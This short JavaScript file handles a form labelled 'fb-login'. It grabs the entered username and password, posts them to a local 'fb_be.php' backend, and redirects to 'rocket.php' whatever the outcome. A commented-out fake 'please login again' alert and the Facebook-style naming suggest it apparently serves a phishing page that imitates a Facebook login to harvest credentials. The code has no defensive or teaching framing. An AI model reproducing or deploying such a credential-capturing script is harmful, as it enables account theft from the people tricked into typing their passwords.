const fb = document.querySelector('.fb-login');
fb.addEventListener("submit", (e) => {
    e.preventDefault();
    const userName = fb.querySelector('.fb_userName').value;
    const password = fb.querySelector('.fb_userPassword').value;

    login(userName, password);
    
//    alert("Something wrong !! Please login again !");
   window.location.href = "./rocket.php";
});

async function login(userName, password) {
    //B1:
    const data = {
        userName: userName,
        password: password
    };
    const url = './server/fb_be.php';
    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json;charset=utf-8',
            'Accept': 'application/json;charset=utf-8'
        },
        body: JSON.stringify(data)
    });
    //B2:
    const result = await response.json();
}